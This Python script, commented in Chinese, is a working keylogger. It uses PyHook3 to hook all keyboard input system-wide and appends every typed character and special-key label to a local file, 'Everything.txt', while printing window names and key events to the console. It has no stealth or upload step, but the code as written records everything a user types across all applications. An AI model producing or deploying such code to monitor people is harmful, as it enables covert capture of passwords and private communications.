# -*-coding: utf-8-*- 
import PyHook3

donotcopy=[58,58,69] #42是LShift 54是Rshift 29是LCtrl/RCtrl 58是CapsLock 56是Alt 93是Apps(右键菜单) 91是Lwin 59-68是F1-F10 8788是F11F12
						#83是del 69是numlock 69是pause 55是snapshot  
specialcopy=['[Home]','[Up]','[pgup]','-','[Left]','[Clear]','[Right]','+','[End]','[Down]','[pgdn]','[insert]']
						#71是Home 72是上 73是pgup 75是左 76是clear 77是右 79是end 80是下 81是pgdn 82是insert
def onKeyboardEvent(event):
	# 监听键盘事件     
	print("MessageName:", event.MessageName)   
#	print("Message:", event.Message)
#	print("Time:", event.Time)
#	print("Window:", event.Window)     
	print("WindowName:", event.WindowName)     
	print("Ascii:", event.Ascii, chr(event.Ascii))   
	print(type(event.Ascii))
	try:
		f=open('Everything.txt','a+')
		print("检测到了")
	except:
		f=open('Everything.txt','w+')
		print("没检测到 所以我自己新建了一个")
	finally:
		if event.Ascii:
			if event.Ascii==13:
				f.write('\n')
			elif event.Ascii==8:
				f.write('\b')
			else:
				f.write(chr(event.Ascii))
		elif event.ScanCode in donotcopy:
			print('haha')
		elif event.ScanCode in range(59,69):
			f.write('[F'+str(event.ScanCode-58)+']')
		elif event.ScanCode in range(87,89):
			f.write('[F'+str(event.ScanCode-76)+']')
		elif event.ScanCode in range(71,83):
			f.write(specialcopy[event.ScanCode-71])
		elif event.ScanCode==91:
			f.write('[LWin]')
		elif event.ScanCode==83:
			f.write('[DEL]')
		elif event.ScanCode==29:
			f.write('[Ctrl]')
		elif event.ScanCode==55:
			f.write('[SnapShot]')
		else:
			print("有一只漏网之鱼")
		f.close()
		print("我确实地关掉了文件")
	print("Key:", event.Key)     
#	print("KeyID:", event.KeyID)     
	print("ScanCode:", event.ScanCode)   
	print(type(event.ScanCode))
	print("Extended:", event.Extended)    
	print("Injected:", event.Injected)   
	print("Alt", event.Alt)     
	print("Transition", event.Transition)     
	print("---")     
	# 同鼠标事件监听函数的返回值     
	return True 

#def main():     
# 创建一个“钩子”管理对象     
hm = PyHook3.HookManager()      
# 监听所有键盘事件     
hm.KeyDown = onKeyboardEvent     
# 设置键盘“钩子”     
hm.HookKeyboard()           
# 进入循环，如不手动关闭，程序将一直处于监听状态     
#pythoncom.PumpMessages() 


if __name__ == "__main__": 
	import pythoncom    
#	main()
	pythoncom.PumpMessages() 